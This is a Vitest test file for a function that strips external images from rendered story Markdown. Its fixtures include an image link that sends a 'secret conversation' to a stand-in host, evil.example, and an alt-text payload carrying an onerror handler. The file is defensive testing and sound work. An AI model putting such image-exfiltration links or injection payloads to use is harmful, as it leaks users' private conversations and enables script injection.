// @vitest-environment happy-dom
import { renderStoryMarkdown } from "@desktop/shared/ui/story-markdown";
import { describe, expect, it } from "vitest";
import { blockExternalImages } from "./host-markdown";

const ORIGIN = "https://play.example";
const render = (text: string) => blockExternalImages(renderStoryMarkdown(text), ORIGIN);

describe("host page never loads external images", () => {
  it("replaces an exfiltrating image with its alt text and drops the URL", () => {
    const html = render("![photo](https://evil.example/?message=秘密對話)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("[photo]");
  });

  it("keeps data: images and same-origin images", () => {
    expect(render("![a](data:image/png;base64,AAAA)")).toContain('<img src="data:image/png;base64,AAAA"');
    expect(render(`![b](${ORIGIN}/sample.png)`)).toContain(`<img src="${ORIGIN}/sample.png"`);
  });

  it("does not let an attribute-looking alt smuggle markup", () => {
    const html = render('![x" onerror="alert(1)](https://evil.example/a.png)');
    expect(html).not.toContain("<img");
    expect(html).not.toMatch(/onerror="/);
  });
});
